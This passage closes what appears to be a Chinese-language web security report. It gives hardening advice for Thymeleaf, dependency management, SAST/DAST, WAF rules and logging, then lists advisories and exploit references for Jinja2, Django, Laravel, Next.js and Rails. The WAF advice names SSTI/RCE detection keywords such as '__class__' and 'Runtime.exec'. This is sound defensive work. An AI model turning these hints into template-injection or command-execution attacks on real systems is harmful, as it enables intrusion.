6. **Thymeleaf**：确保视图名称不包含用户输入，使用白名单验证视图名

### 长期安全加固建议

1. **依赖管理**：建立自动化的依赖版本监控机制（Dependabot / Renovate），及时接收安全更新通知
2. **SAST/DAST**：在 CI/CD 管道中集成静态和动态代码扫描工具
3. **WAF 规则**：部署 WAF 并更新 SSTI / RCE 检测规则，特别是针对 `__class__`、`__mro__`、`Runtime.exec` 等关键字
4. **最小权限**：Web 应用进程使用低权限用户运行，限制文件系统和网络访问
5. **安全头部**：为所有 HTTP 响应添加 `Content-Security-Policy`、`X-Frame-Options` 等安全头部
6. **日志监控**：部署 SIEM 系统，对异常请求模式进行实时告警

---

## 0x09 参考资料

1. Pallets Jinja2 安全公告：`https://github.com/pallets/jinja/security/advisories`
2. Django 官方安全发布：`https://www.djangoproject.com/weblog/2024/jan/02/security-releases/`
3. Ambionics - Laravel Debug RCE：`https://www.ambionics.io/blog/laravel-debug-rce`
4. Next.js CVE-2025-29927 安全公告：`https://nextjs.org/blog/security-nextjs-cve-2025-29927`
5. Next.js CVE-2024-34350 / CVE-2024-34351 安全公告：`https://nextjs.org/blog/security-nextjs-cve-2024-34351`
6. Rails 7.0.8.1 / 7.1.3.1 安全发布：`https://rubyonrails.org/2024/02/21/Rails-7-0-8-1-7-1-3-1-Released`
7. Nuclei 模板社区：`https://github.com/projectdiscovery/nuclei-templates`
8. CISA 已知被利用漏洞目录（KEV）：`https://www.cisa.gov/known-exploited-vulnerabilities-catalog`
9. Pwntester - Thymeleaf SSTI 研究：`https://www.pwntester.com/blog/2023/04/06/spring-web-thymeleaf-ssti/`
10. Exploit-DB Laravel Ignition：`https://www.exploit-db.com/exploits/50093`